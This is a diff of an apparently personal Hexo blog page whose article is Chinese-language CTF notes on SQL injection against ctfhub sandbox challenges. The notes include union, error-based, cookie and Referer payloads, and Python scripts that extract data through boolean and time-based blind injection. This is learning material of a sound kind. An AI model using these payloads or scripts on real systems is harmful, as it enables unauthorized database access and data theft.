@@ -29,7 +29,9 @@
 
     <script src="/libs/jquery/jquery.min.js"></script>
 
-<meta name="generator" content="Hexo 5.0.2"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+<meta name="generator" content="Hexo 5.0.2"></head>
+
+
 
 
 <body>
@@ -111,6 +113,17 @@
       <i class="fas fa-comments" style="zoom: 0.6;"></i>
       
       <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
     </a>
     
   </li>
@@ -203,6 +216,17 @@
 			    <i class="fa-fw fas fa-comments"></i>
 			
 			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
 		</a>
           
         </li>
@@ -334,8 +358,7 @@
     }
 
     .toc-widget .toc-title {
-        margin: 35px 0 15px 0;
-        padding-left: 17px;
+        padding: 35px 0 15px 17px;
         font-size: 1.5rem;
         font-weight: bold;
         line-height: 1.5rem;
@@ -347,7 +370,7 @@
     }
 
     #toc-content {
-        height: calc(100vh - 250px);
+        padding-bottom: 30px;
         overflow: auto;
     }
 
@@ -442,6 +465,11 @@
                 
 
                 
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
+                    2021-02-18
+                </div>
+                
 
                 
                 <div class="info-break-policy">
@@ -466,6 +494,14 @@
             </div>
         </div>
         <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
+        
+
+        
+
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <h2 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h2><h3 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h3><p>sql注入是一种在ctf中比较常见的题型，在曾经的大家并没有注重安全的年代很多网站都有sql注入的漏洞，当然随着技术的发展，存在sql注入的网站越来越少，但其依旧是web安全中一大威胁，且一些题目中会包含相关步骤，需要了解掌握，以下主要记录各种手动注入的步骤</p>
@@ -614,7 +650,8 @@
 <li><p>但我们发现这时候的flag不全，只有一部分，这是因为用xpath报错值显示32位，这时候就需要使用一个函数，叫做<strong>mid()</strong>,</p>
 </li>
 </ul>
-<pre><code>mid(str,start,[length])  str:截取的字符串  start:起始位置  length:截取的长度，可以忽略</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">mid(str,start,[length])  str:截取的字符串  start:起始位置  length:截取的长度，可以忽略<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>将子select当做str参数，start从32开始，就可以取到flag后半部分了<code>http://challenge-fbd23468e7d17f1b.sandbox.ctfhub.com:10080/?id=1 union select 1,extractvalue(1,concat(0x7e,mid((select flag from flag),32)))</code></p>
 <ul>
 <li>我们也可以使用updatexml()函数，区别只是最后多一个参数，那个参数写1就行了</li>
@@ -636,22 +673,23 @@
 <p>下面通过ctfhub的布尔盲注来进行讲解</p>
 <p><code>http://challenge-23383a60e8712835.sandbox.ctfhub.com:10080/?id=1 and (select ascii(substr(flag,1,1)) from flag)=99</code></p>
 <p>我已经直接查flag了，因为的数据库结构和之前是一样的，因为过程一样所以之前的查库查表不在进行，我们输入了上述语句后可以看到网页给出提示<strong>query_success</strong>，说明我们flag表的flag字段的第一个字符时小写的C，因为ascii码为99。接下来怎么办，总不能自己一个一个实验吧，我们选择使用burp suit进行爆破，以两个字段，即substr里的第二个参数和最后的ascii值判断作为爆破的点，依次爆破就能得到flag了，（这是按照我学的视频里的方法，总感觉太慢了，所以我决定去看writeup，发现writeup是写了脚本，那我也写脚本吧，用个requests库就可以了，还不咋会，照着写了一个）</p>
-<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
 <span class="token keyword">import</span> sys
 name<span class="token operator">=</span> <span class="token string">''</span>
 mark <span class="token operator">=</span> <span class="token string">'query_success'</span>
 urlOpen<span class="token operator">=</span><span class="token string">'http://challenge-62b5ddccaa603532.sandbox.ctfhub.com:10080/?id='</span>
-<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token comment" spellcheck="true">#substr子段</span>
-    <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">48</span><span class="token punctuation">,</span><span class="token number">126</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true">#ascii值子段</span>
-        url <span class="token operator">=</span> urlOpen<span class="token operator">+</span><span class="token string">'1 and (select ascii(substr(flag,%d,1)) from flag)=%d'</span><span class="token operator">%</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#依次判断</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token comment">#substr子段</span>
+    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">48</span><span class="token punctuation">,</span><span class="token number">126</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment">#ascii值子段</span>
+        url <span class="token operator">=</span> urlOpen<span class="token operator">+</span><span class="token string">'1 and (select ascii(substr(flag,%d,1)) from flag)=%d'</span><span class="token operator">%</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span>  <span class="token comment">#依次判断</span>
         r<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
-        <span class="token keyword">if</span> mark <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>  <span class="token comment" spellcheck="true">#可以知道比对成功就是query_sucess,所以以此作为判断</span>
-            name<span class="token operator">=</span>name<span class="token operator">+</span>chr<span class="token punctuation">(</span>j<span class="token punctuation">)</span>
+        <span class="token keyword">if</span> mark <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>  <span class="token comment">#可以知道比对成功就是query_sucess,所以以此作为判断</span>
+            name<span class="token operator">=</span>name<span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>
             <span class="token keyword">print</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span>
             <span class="token keyword">break</span>
 <span class="token keyword">print</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span>
 
-</code></pre>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>最后就可以输出了flag了，前面查询库，表也和这个类似，只是sql语句换一下罢了，这里就偷懒了</p>
 <h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>也叫时间延时注入，这种注入在我们输入单引号，双引号，小括号时他都不会显示出报错（但其实是已经出错了），页面不会改变，这时候就需要通过if(),sleep()函数，使得我们的判断条件为真时会有页面延时的情况出现，即，构造好了语句，如果我们想要判断的条件为真，则页面执行会出现延迟，如果为假则不会有延迟。给出一个语句实例：<code>?id=-1 or if(select ascii(substr(table_name,1,1)) from informatio_schema.tables where tabel_schema=database() limit 0,1)=100,sleep(2),0) #</code></p>
 <p>首先看一下if()和sleep()</p>
@@ -668,12 +706,12 @@ urlOpen<span class="token operator">=</span><span class="token string">'http://c
 <p><strong><em>这种手动做的话肯定不现实，需要借助工具或者写脚本，还是强调，这里只是原理</em></strong></p>
 <p>还是以ctfhub的时间注入作为实例，还是写脚本解决，首先先测试一下：<code> http://challenge-5cb70d9ee61e79a0.sandbox.ctfhub.com:10080/?id=-1 or if((select ascii(substr(database(),1,1))=115),sleep(2),0) #</code></p>
 <p>可以看到等于115时可以产生延时，那就按照这个语法写脚本就好了</p>
-<pre class=" language-python"><code class="language-python">name<span class="token operator">=</span><span class="token string">''</span>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">name<span class="token operator">=</span><span class="token string">''</span>
 urlOpen<span class="token operator">=</span><span class="token string">'http://challenge-5cb70d9ee61e79a0.sandbox.ctfhub.com:10080/?id=-1'</span>
-<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-        <span class="token comment" spellcheck="true"># url=urlOpen+' or if((select ascii(substr(database(),%d,1)))=%d,sleep(2),0) #'%(i,j) #库名</span>
-        <span class="token comment" spellcheck="true"># url = urlOpen +' or if((select ascii(substr(table_name,%d,1) from information_schema.tables where table_schema=\'sqli\')=%d),sleep(2),0) #'%(i,j)</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token comment"># url=urlOpen+' or if((select ascii(substr(database(),%d,1)))=%d,sleep(2),0) #'%(i,j) #库名</span>
+        <span class="token comment"># url = urlOpen +' or if((select ascii(substr(table_name,%d,1) from information_schema.tables where table_schema=\'sqli\')=%d),sleep(2),0) #'%(i,j)</span>
         url <span class="token operator">=</span> urlOpen <span class="token operator">+</span><span class="token string">' or if((select ascii(substr(flag,%d,1)) from flag)=%d,sleep(1),0) #'</span> <span class="token operator">%</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span>
         time1<span class="token operator">=</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
         <span class="token keyword">try</span><span class="token punctuation">:</span>
@@ -682,24 +720,27 @@ urlOpen<span class="token operator">=</span><span class="token string">'http://c
             <span class="token keyword">pass</span>
         time2<span class="token operator">=</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
         <span class="token keyword">if</span> time2<span class="token operator">-</span>time1<span class="token operator">>=</span><span class="token number">1</span><span class="token punctuation">:</span>
-            name<span class="token operator">=</span>name<span class="token operator">+</span>chr<span class="token punctuation">(</span>j<span class="token punctuation">)</span>
+            name<span class="token operator">=</span>name<span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>
             <span class="token keyword">print</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span>
             <span class="token keyword">break</span>
-<span class="token keyword">print</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span></code></pre>
+<span class="token keyword">print</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>跑出来就好了，但发现跑的过程很艰辛，因为原理是时间延迟，所以如果网络不畅或者requests超时啥的会让人很头疼，可能出现一些错误的字符。。。跑了好多次。。。依旧失败了，每次都有flag结构但都会有些位出错，我选择sqlmap了。。。**<em>哈哈哈，最后一次脚本和sqlmap同时跑脚本先跑出来了，真的是网络原因，不稳定是真滴难受**</em></p>
 <h3 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h3><p>就是注入点在cookie中，cookie是啥不再介绍，我们需要在cookie处进行注入，具体注入方法按照环境来决定，需要自己慢慢的尝试，也是一个经验的问题。需要多练习，以ctfhub上的cookie注入来作为例子。使用burpsuite来进行注入</p>
 <p>打开题目告诉我们注入点变了，使用burp抓包</p>
 <p>可以看到cookie：</p>
-<pre><code>Cookie: id=1; hint=id%E8%BE%93%E5%85%A51%E8%AF%95%E8%AF%95%EF%BC%9F</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">Cookie: id&#x3D;1; hint&#x3D;id%E8%BE%93%E5%85%A51%E8%AF%95%E8%AF%95%EF%BC%9F<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>我们在id这里进行注入，在repeter里进行 </p>
 <p><code>Cookie: id=-1 union select 1,database();</code></p>
 <p>可以看到已经显示出了database，继续注入就好了，不再演示，最后的语句是<code>Cookie: id=-1 union select 1,group_concat(nuwjexalch) from nuyuogkrho;</code></p>
 <p>得到flag</p>
 <h3 id="http-Referer注入"><a href="#http-Referer注入" class="headerlink" title="http-Referer注入"></a>http-Referer注入</h3><p>及注入点在referer中，可以注意到在讲解视屏中除了可以看到，讲解人通过其报错信息发现，<strong>并不是通过select的语句进行注入，而是update或者insert</strong>，所以需要复习一下sql语句啊。。。所以其实重要的还是找到注入点和使其报错以及<strong>通过构造语句使其不报错</strong>，下面以ctfhub上的referer注入为实例进行实验，打开页面可以看到提示我们“请在referer输入id”，使用burpsuite进行抓包，抓了后看了一下，没有referer字段，需要自己构造，注意构造的格式，最开始就是因为构造格式不对所以错了</p>
 <p>最开始是这样构造的：</p>
-<pre><code>Referer: id=1    #发现不对
+<pre class="line-numbers language-none"><code class="language-none">Referer: id&#x3D;1    #发现不对
 Referer: 1        #这样才对
-接下来继续注入就对了</code></pre>
+接下来继续注入就对了<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
 <p><code>Referer: -1 union select 1,group_concat(hnsyfohxaa) from verizqvbgj</code></p>
 <p>这是最后的referer语句</p>
 <h3 id="sql注入读写文件"><a href="#sql注入读写文件" class="headerlink" title="sql注入读写文件"></a>sql注入读写文件</h3><p>读取文件是通过一个Load_file(file_name)函数来进行的对服务器上的文件的读取,这个函数有四个使用条件</p>
@@ -778,9 +819,10 @@ Referer: 1        #这样才对
 <p>?inject=1’;rename table words to words1;rename table `19198109311145` to words;alter table words change flag id varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;desc  words;#</p>
 <p>rename table `words` to `www`;rename table `1919810931114514`  to `words`;alter table words change flag id varchar(100);#</p>
 <p>注意，下面这一行rename时每一个表名都加了反引号，我这里好像要这样才能改表名称，不然会显示words表不存在，以后最好还是都加上；最后用一个 ？inject=1’ or 1=1 –+就可以找到flag了；</p>
-<p>记录一下rename和alter函数</p>
-<pre><code>rename命令格式：rename table 原表名 to 新表名;</code></pre>
-<pre><code>如需在表中添加列，请使用下面的语法:
+<p>记录一下rename和alter函数。</p>
+<pre class="line-numbers language-none"><code class="language-none">rename命令格式：rename table 原表名 to 新表名;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">如需在表中添加列，请使用下面的语法:
 ALTER TABLE table_name ADD column_name datatype
 
 如需删除表中的列，请使用下面的语法（请注意，某些数据库系统不允许这种在数据库表中删除列的方式）：
@@ -791,15 +833,16 @@ alter table table_name change a b integer(这个是数据类型，可以是varch
 
 要改变表中列的数据类型，请使用下面的语法：
 
-SQL Server / MS Access：
+SQL Server &#x2F; MS Access：
 ALTER TABLE table_name ALTER COLUMN column_name datatype
 
-My SQL / Oracle：
+My SQL &#x2F; Oracle：
 ALTER TABLE table_name MODIFY COLUMN column_name datatype
 
 Oracle 10G 之后版本:
 ALTER TABLE table_name MODIFY column_name datatype;
-flag&amp;#123;f28974b4-511c-4c6c-9c76-296efebc02e4&amp;#125;</code></pre>
+flag&#123;f28974b4-511c-4c6c-9c76-296efebc02e4&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>+++++++++</p>
 <h3 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h3><p>记录一道题的解法，是[极客大挑战 2019]EasySQL的题目，</p>
 <p>登录后发现是get型传递参数，加单引号报错，可以看到是字符型，这里使用了一种<strong>万能密码</strong></p>
@@ -831,6 +874,7 @@ flag&amp;#123;f28974b4-511c-4c6c-9c76-296efebc02e4&amp;#125;</code></pre>
 </ul>
 <p><strong><em>小结一下，这些都只是最最基础的，在实际的题目中会有很多的骚操作，比如过滤掉逗号，过滤掉括号，需要大量的经验和骚操作，所以任重道远，需要未来更多的实践和学习，<del>这些是人学的东西，又多又杂，淦</del>比如过滤了逗号我们使用括号吧要用的括起来。</em></strong></p>
 
+                
             </div>
             <hr/>
 
@@ -855,7 +899,7 @@ flag&amp;#123;f28974b4-511c-4c6c-9c76-296efebc02e4&amp;#125;</code></pre>
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://119.23.18.158/2020/09/22/sqlinjection/">http://119.23.18.158/2020/09/22/sqlinjection/</a>
+                    <a href="http://0xahh.top/2020/09/22/sqlinjection/">http://0xahh.top/2020/09/22/sqlinjection/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -1031,7 +1075,7 @@ flag&amp;#123;f28974b4-511c-4c6c-9c76-296efebc02e4&amp;#125;</code></pre>
                         <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
                     </div>
                     <div id="wechat">
-                        <img src="/medias/reward/wechat.jpg" class="reward-img" alt="微信打赏二维码">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
                     </div>
                 </div>
             </div>
@@ -1054,6 +1098,271 @@ flag&amp;#123;f28974b4-511c-4c6c-9c76-296efebc02e4&amp;#125;</code></pre>
     
 
     
+
+    
+
+    
+        <style>
+    .valine-card {
+        margin: 1.5rem auto;
+    }
+
+    .valine-card .card-content {
+        padding: 20px 20px 5px 20px;
+    }
+
+    #vcomments textarea {
+        box-sizing: border-box;
+        background: url("/medias/comment_bg.png") 100% 100% no-repeat;
+    }
+
+    #vcomments p {
+        margin: 2px 2px 10px;
+        font-size: 1.05rem;
+        line-height: 1.78rem;
+    }
+
+    #vcomments blockquote p {
+        text-indent: 0.2rem;
+    }
+
+    #vcomments a {
+        padding: 0 2px;
+        color: #4cbf30;
+        font-weight: 500;
+        text-decoration: none;
+    }
+
+    #vcomments img {
+        max-width: 100%;
+        height: auto;
+        cursor: pointer;
+    }
+
+    #vcomments ol li {
+        list-style-type: decimal;
+    }
+
+    #vcomments ol,
+    ul {
+        display: block;
+        padding-left: 2em;
+        word-spacing: 0.05rem;
+    }
+
+    #vcomments ul li,
+    ol li {
+        display: list-item;
+        line-height: 1.8rem;
+        font-size: 1rem;
+    }
+
+    #vcomments ul li {
+        list-style-type: disc;
+    }
+
+    #vcomments ul ul li {
+        list-style-type: circle;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    #vcomments table, th, td {
+        border: 0;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments h1 {
+        font-size: 1.85rem;
+        font-weight: bold;
+        line-height: 2.2rem;
+    }
+
+    #vcomments h2 {
+        font-size: 1.65rem;
+        font-weight: bold;
+        line-height: 1.9rem;
+    }
+
+    #vcomments h3 {
+        font-size: 1.45rem;
+        font-weight: bold;
+        line-height: 1.7rem;
+    }
+
+    #vcomments h4 {
+        font-size: 1.25rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    #vcomments h5 {
+        font-size: 1.1rem;
+        font-weight: bold;
+        line-height: 1.4rem;
+    }
+
+    #vcomments h6 {
+        font-size: 1rem;
+        line-height: 1.3rem;
+    }
+
+    #vcomments p {
+        font-size: 1rem;
+        line-height: 1.5rem;
+    }
+
+    #vcomments hr {
+        margin: 12px 0;
+        border: 0;
+        border-top: 1px solid #ccc;
+    }
+
+    #vcomments blockquote {
+        margin: 15px 0;
+        border-left: 5px solid #42b983;
+        padding: 1rem 0.8rem 0.3rem 0.8rem;
+        color: #666;
+        background-color: rgba(66, 185, 131, .1);
+    }
+
+    #vcomments pre {
+        font-family: monospace, monospace;
+        padding: 1.2em;
+        margin: .5em 0;
+        background: #272822;
+        overflow: auto;
+        border-radius: 0.3em;
+        tab-size: 4;
+    }
+
+    #vcomments code {
+        font-family: monospace, monospace;
+        padding: 1px 3px;
+        font-size: 0.92rem;
+        color: #e96900;
+        background-color: #f8f8f8;
+        border-radius: 2px;
+    }
+
+    #vcomments pre code {
+        font-family: monospace, monospace;
+        padding: 0;
+        color: #e8eaf6;
+        background-color: #272822;
+    }
+
+    #vcomments pre[class*="language-"] {
+        padding: 1.2em;
+        margin: .5em 0;
+    }
+
+    #vcomments code[class*="language-"],
+    pre[class*="language-"] {
+        color: #e8eaf6;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+
+    #vcomments b,
+    strong {
+        font-weight: bold;
+    }
+
+    #vcomments dfn {
+        font-style: italic;
+    }
+
+    #vcomments small {
+        font-size: 85%;
+    }
+
+    #vcomments cite {
+        font-style: normal;
+    }
+
+    #vcomments mark {
+        background-color: #fcf8e3;
+        padding: .2em;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+</style>
+
+<div class="card valine-card" data-aos="fade-up">
+    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
+        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
+        <span>评论</span>
+    </div>
+    <div id="vcomments" class="card-content" style="display: grid">
+    </div>
+</div>
+
+<script src="/libs/valine/av-min.js"></script>
+<script src="/libs/valine/Valine.min.js"></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        appId: '9go79qnTupRR61jWEfIWVzvy-gzGzoHsz',
+        appKey: 'tVB7E05bcxLCeUKo8fmejn8O',
+        notify: 'true' === 'true',
+        verify: 'true' === 'true',
+        visitor: 'true' === 'true',
+        avatar: 'mm',
+        pageSize: '10',
+        lang: 'zh-cn',
+        placeholder: 'just go go'
+    });
+</script>
 
     
 
@@ -1195,16 +1504,9 @@ flag&amp;#123;f28974b4-511c-4c6c-9c76-296efebc02e4&amp;#125;</code></pre>
 <script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
 
 
-<!-- 代码块折行 -->
-
-<style type="text/css">
-code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
-</style>
-
-
     </div>
     <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
-        <div class="toc-widget">
+        <div class="toc-widget card" style="background-color: white;">
             <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
             <div id="toc-content"></div>
         </div>
@@ -1305,63 +1607,12 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
 
     <footer class="page-footer bg-color">
     
-        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
-<style>
-    .aplayer .aplayer-lrc p {
-        
-        display: none;
-        
-        font-size: 12px;
-        font-weight: 700;
-        line-height: 16px !important;
-    }
-
-    .aplayer .aplayer-lrc p.aplayer-lrc-current {
-        
-        display: none;
-        
-        font-size: 15px;
-        color: #42b983;
-    }
-
-    
-    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
-        left: -66px !important;
-    }
-
-    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
-        left: 0px !important;
-    }
-
-    
-</style>
-<div class="">
-    
-    <div class="row">
-        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
-                   server="netease"
-                   type="playlist"
-                   id="2614947145"
-                   fixed='true'
-                   autoplay='false'
-                   theme='#42b983'
-                   loop='all'
-                   order='random'
-                   preload='auto'
-                   volume='0.7'
-                   list-folded='true'
-        >
-        </meting-js>
-    </div>
-</div>
-
-<script src="/libs/aplayer/APlayer.min.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
-
-    
     <div class="container row center-align" style="margin-bottom: 0px !important;">
         <div class="col s12 m8 l8 copy-right">
             Copyright&nbsp;&copy;
+            
+                <span id="year">2020-2021</span>
+            
             <span id="year">2020</span>
             <a href="/about" target="_blank">0xahh</a>
             |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
@@ -1369,7 +1620,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">39.6k</span>&nbsp;字
+                class="white-color">43.7k</span>&nbsp;字
             
             
             
@@ -1419,10 +1670,6 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
 
 
 
-    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
-        <i class="fas fa-rss"></i>
-    </a>
-
 </div>
     </div>
 </footer>
@@ -1442,10 +1689,95 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
     </div>
 </div>
 
-<script src="/js/search.js"></script>
 <script type="text/javascript">
 $(function () {
-    searchFunc("/search.xml", 'searchInput', 'searchResult');
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
 });
 </script>
 
@@ -1493,6 +1825,7 @@ $(function () {
 
     
 
+	
     
 
     
